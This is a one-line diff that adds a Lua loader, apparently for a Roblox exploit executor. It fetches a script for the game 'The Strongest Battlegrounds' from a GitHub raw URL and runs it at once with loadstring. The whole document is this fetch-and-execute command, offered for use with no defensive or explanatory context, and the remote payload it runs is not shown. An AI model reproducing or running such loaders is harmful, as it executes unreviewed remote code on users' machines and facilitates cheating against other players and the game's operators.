@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/the-strongest-battlegrounds-spam7-ws8e80fogfd7ih.lua"))()
